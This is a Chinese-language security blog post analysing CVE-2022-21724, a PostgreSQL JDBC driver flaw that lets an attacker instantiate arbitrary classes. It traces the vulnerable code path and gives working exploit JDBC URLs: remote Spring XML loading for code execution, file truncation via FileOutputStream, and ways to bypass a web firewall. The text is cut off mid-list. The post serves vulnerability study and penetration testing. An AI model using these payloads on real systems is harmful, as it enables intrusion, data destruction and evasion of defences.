---
title: Postgresql JDBC Attack and Stuff
url: https://su18.org/post/postgresql-jdbc-attack-and-stuff/
source: 素十八
date: 2025-06-03
fetch_date: 2025-10-06T22:55:08.849356
---

# Postgresql JDBC Attack and Stuff

[![](https://su18.org/images/avatar.png?v=1749017091939)](https://su18.org)

# 素十八

你救赎的人 终将成为你的光

[首页](/)
[归档](/archives)
[标签](/tags)
[Javasec](http://javasec.org)
[Downly](https://www.downly.cn/)

## Postgresql JDBC Attack and Stuff

2025-06-02

61 min read
[# 漏洞利用](https://su18.org/tag/fQtuCjxPQ/)
[# 绕过](https://su18.org/tag/0HscXmAki/)
[# rce](https://su18.org/tag/88AcuR3x8y/)
[# java](https://su18.org/tag/J9zfIgD5go/)
[# 渗透测试](https://su18.org/tag/TjYa_DdRZS/)
[# 漏洞原理](https://su18.org/tag/V0FeVGMWY/)
[# 总结](https://su18.org/tag/c16M0jvs3/)

![](https://su18.org/post-images/postgresql-jdbc-attack-and-stuff.png)

# 零、前言

前一段时间，phith0n 在知识星球“代码审计”中发布了一个挑战，并在同名微信公众号中发布了挑战赛的结果，主要是针对 Postgresql JDBC Attack 的不出网利用姿势，其中包括了各种预期解和非预期解法。

然后很多红队大哥在问为什么实战没有触发成功，为什么不稳，在实战中也恰好遇到几次，就决定要仔细研究一下。突然发现在之前的文章 《JDBC Connection URL Attack》竟然没有 Postgresql JDBC 的内容，我好像也没认真完整看过，在实战中也是一直用公开的 POC 打，因此本文是对其内容的完整学习记录以及一些思考。

是谁 2025 年还没学会 2022 年的漏洞啊？QWQ

好久没更新博客了，找一下手感，个人能力有限，如行文有误，望大佬们多多指正，谢谢大家。

# 一、前置知识

在进入这个挑战之前，先来学习和回顾一下需要的前置知识。

## 1. CVE-2022-21724

### ① 漏洞描述

根据 NVD 官方描述，pgjdbc 是 PostgreSQL 官方 JDBC 驱动，在使用当攻击者可以控制 jdbc url 或 properties 时，可能导致安全风险。原因是驱动程序在实例化部分属性对应类时，并未检查其是否实现自期望类或接口，导致恶意用户可以实例化任意类，并进一步达到 RCE。

NVD 评分：[9.8 CRITICAL](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2022-21724&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1&source=NIST)

Credits: [iSafeBlue](https://github.com/iSafeBlue)

### ② 影响版本

根据 NVD 信息：

```
< 42.2.25
>= 42.3.0,< 42.3.2
```

### ③ 漏洞代码

此处以 42.3.0 版本为例。漏洞点位于 `org.postgresql.util.ObjectFactory#instantiate()` 方法。

![](https://su18.org/post-images/1748831615482.png)

漏洞非常好理解，此方法接收一个 Class 类名、Properties 对象、一个布尔值、一个 String 类型的参数。

方法会根据传参查找对应 Class ，并优先查找其 Properties 构造方法，如果为空，并执行尝试 String 类型，则查找是否存在单 String 构造方法，并进行初始化。而在这过程中，没有按照需求检查此 Class 是否是期望 Class，从而导致漏洞。

因此，满足如下条件的 Class 可以利用：

1. 存在 Properties 构造方法，且构造方法中达到恶意目的；
2. 存在单 String 构造方法，且构造方法中达到恶意目的。

### ④ 利用点

了解了漏洞成因后，接下来寻找调用漏洞点的功能参数，通过查看源码及官方通告，看到主要有以下几种触发方式。

此处以 42.3.0 版本为例。

**[1] socketFactory & socketFactoryArg**

最常见的利用方式，本节将以此方式为主，依次跟一下完整漏洞触发代码，在后面的部分就不会重复跟了。测试代码如下：

```
	public static void main(String[] args) throws Exception {
		String socketFactoryClass = "org.springframework.context.support.ClassPathXmlApplicationContext";
		String socketFactoryArg   = "http://127.0.0.1/poc.xml";
		String dbUrl              = "jdbc:postgresql:///?socketFactory=" + socketFactoryClass + "&socketFactoryArg=" + socketFactoryArg;
		DriverManager.getConnection(dbUrl);
	}
```

从 `org.postgresql.Driver#connect` 方法开始，判断 jdbc url 连接要以 `jdbc:postgresql:` 开始，随后使用 `getDefaultProperties` 方法收集配置文件中的相关属性键值对。然后使用 `parseURL` 解析 url。

![](https://su18.org/post-images/1748831706783.png)

接下来跟一下 `parseURL` 方法，依次看下逻辑：

首先查找 `?`，用来作为服务器地址（Server）和参数（ Args）的分隔符，然后截取 `jdbc:postgresql:` 字符串。

![](https://su18.org/post-images/1748831716349.png)

首先解析服务器地址（Server），如果以 `//` 开始，则要求必须以 `/` 结束

![](https://su18.org/post-images/1748831765033.png)

查看这个解析过程，发现也是支持同时填写多个地址，例如：

```
jdbc:postgresql://aaa.com,127.0.0.1:2234,/?socketFactory=
```

那么在利用过程中可以做出如下变形：

```
jdbc:postgresql://,,,  ,,,, ,, , ,,/?socketFactory=
```

或者空格或是什么都不写也是可以的

```
jdbc:postgresql:///?socketFactory=
```

而如果地址不以 `//` 开始，则认为其未设置，将会默认设置为默认 localhost:5432。

![](https://su18.org/post-images/1748831795399.png)

因此，在 `jdbc:postgresql:` 和 `?` 之间，可以写入任意字符。例如：

```
jdbc:postgresql:hihowareyouimfinethankyouandyou?socketFactory=
```

或者

```
jdbc:postgresql:socketFactory=aaa&socketFactoryArg=bbb?socketFactory=
```

又或者

```
jdbc:postgresql:jdbc:mysql://127.0.0.1:3306/testdb?socketFactory=
```

都不会影响后面解析，因此这部分可以用来做些文章，例如多写绕过 WAF 之类的防护之类，这部分可以自行发挥想象力。

接下来是参数（ Args）的解析，则是使用 `&` 符切割，以 `=` 来切割键值对，并将值 URLdecode 之后存放在整体 Properties 对象中。

![](https://su18.org/post-images/1748831817418.png)

解析后准备开始连接，其中调用了 `setupLoggerFromProperties` 方法，此方法是下一小节“Postgresql JDBC 任意文件写入” 利用方式的关键方法，因此在下一节中再进行阐述。

![](https://su18.org/post-images/1748831841676.png)

`makeConnection` 初始化 `org.postgresql.jdbc.PgConnection` 对象来实现连接。

![](https://su18.org/post-images/1748831862798.png)

PgConnection 中调用 `ConnectionFactory.openConnection()`  方法

![](https://su18.org/post-images/1748831885103.png)

继续跟调用，这里判断了一个协议版本，目前只支持了 3 版本。然后是一个工厂类设计，调用 `org.postgresql.core.v3.ConnectionFactoryImpl.openConnectionImpl` 方法建立连接，这里是为了给未来不同版本的协议做扩展用。

![](https://su18.org/post-images/1748831917551.png)

在此方法中调用了 `org.postgresql.core.SocketFactoryFactory.getSocketFactory` 方法，用来获取进行链接的 Socket 工厂类。

![](https://su18.org/post-images/1748831940314.png)

而此方法就是第一个利用点，可以看到从 Properties 中获取 `socketFactory/socketFactoryArg` 属性值，并使用 `ObjectFactory.instantiate` 方法进行实例化，也就是可以借助这两个参数实例化单 string 的构造方法了。

![](https://su18.org/post-images/1748831961515.png)

所以此处的触发方式为

```
jdbc:postgresql:///?socketFactory=恶意类名&socketFactoryArg=单String恶意类参数
或
jdbc:postgresql:///?socketFactory=恶意类名&恶意属性名=恶意属性值
```

**[2] sslfactory & sslfactoryarg**

socketFactory 利用点是在初始化连接工厂类时，而如果不指定 socketFactory，则会使用默认的工厂类，并继续执行逻辑。因此我们继续跟，初始化工厂类后，会获取全部的 host，并使用 while 循环尝试简历连接，实际调用 `org.postgresql.core.v3.ConnectionFactoryImpl#tryConnect` 方法

![](https://su18.org/post-images/1748831987568.png)

此方法会创建连接，并判断目标服务器是否支持 SSL。

![](https://su18.org/post-images/1748832011485.png)

在 `org.postgresql.core.v3.ConnectionFactoryImpl#enableSSL` 方法会与目标服务器进行 SSL 协议数据交互，并判断服务器返回值为字符 `S` 也就是 byte 83，则代表服务器支持 SSL。

![](https://su18.org/post-images/1748832037723.png)

在 `org.postgresql.ssl.MakeSSL#convert` 方法中见到了熟悉的代码。

![](https://su18.org/post-images/1748832079319.png)

`org.postgresql.core.SocketFactoryFactory#getSslSocketFactory` 则与 `getSocketFactory` 类似，调用 `ObjectFactory.instantiate` 方法，只不过参数变成了 sslfactory & sslfactoryarg。

![](https://su18.org/post-images/1748832100202.png)

所以此处的触发方式为：

```
jdbc:postgresql:///?sslfactory=恶意类名&sslfactoryarg=单String恶意类参数
或
jdbc:postgresql:///?sslfactory=恶意类名&恶意属性名=恶意属性值
```

但这种方式就有了前置条件：能联通一个真的支持 SSL 的 Postgresql 数据库，或连接一个能返回 `S` 的监听端口（或恶意服务器）。

**[3] sslhostnameverifier**

除了上面两个方式外，还有其他例如 sslhostnameverifier/sslpasswordcallback/authenticationPluginClassName 就是一些无 String 类型参数，只能以 Properties 方式触发的，并且触发点较为靠后，实战利用性可能较低，因此这里不占用过多篇幅，仅以 sslhostnameverifier 为例进行复现。

sslhostnameverifier 参数的触发点比 sslfactory 还要更加靠后，在初始化 SSLSocketFactory 后，将会建立完整连接并进行 Handshake。并随后提供了通过调用 `verifyPeerName` 方法检查 Host 名的功能。

![](https://su18.org/post-images/1748832132785.png)

`verifyPeerName` 则也是调用 `ObjectFactory.instantiate` 进行类的实例化，但是因为他没有对应传参的参数，因此只能使用 Properties 的方式进行利用。

![](https://su18.org/post-images/1748832168952.png)

所以此处的触发方式为：

```
jdbc:postgresql:///?sslpasswordcallback=恶意类名&恶意属性名=恶意属性值
```

此时就更需要能较为完整交互 SSL 连接的地址了。

如果你想搭建支持 SSL 的 postgre 数据库进行复现，命令如下：

```
mkdir postgre
cd postgre
openssl req -new -text -passout pass:abcd -subj /CN=localhost -out server.req
openssl rsa -in privkey.pem -passin pass:abcd -out server.key
openssl req -x509 -in server.req -text -key server.key -out server.crt
docker run -d --name postgressl -v "$PWD/server.crt:/var/lib/postgresql/server.crt:ro" -v "$PWD/server.key:/var/lib/postgresql/server.key:ro"  postgres:11-alpine -c ssl=on -c ssl_cert_file=/var/lib/postgresql/server.crt -c ssl_key_file=/var/lib/postgresql/server.key
```

### ⑤ 利用方式

接下来就是最终利用方式了，下面为一些实战打过的和收集到的利用方式，前五个均为单 String 构造方法的利用，第六个是 Properties 属性利用方式。

**[1] ClassPathXmlApplicationContext**

历史上最经典的利用，ClassPathXmlApplicationContext/FileSystemXmlApplicationContext 通过远程执行 xml 出网来 RCE。需要依赖 spring-context-support。（或者其他自行封装包例如 weblogic 的 `com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` 等）

此种利用方式首先出现在 Jackson 的利用链 CVE-2017-17485 中，后作为单 String 构造方法被广泛利用。

```
jdbc:postgresql:///?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://127.0.0.1:8000/poc.xml
```

关于 ClassPathXmlApplicationContext 的更多利用细节将在后面进行描述。

**[2] FileOutputStream/InputStream**

FileOutputStream 清空文件，实战中可以配合业务逻辑清空特定文件，达到 RCE 的目的。

```
jdbc:postgresql:///?socketFactory=java.io.FileOutputStream&socketFactoryArg=/var/www/app/install.lck
```

反过来 FileInputStream 可以探测文件是否存在...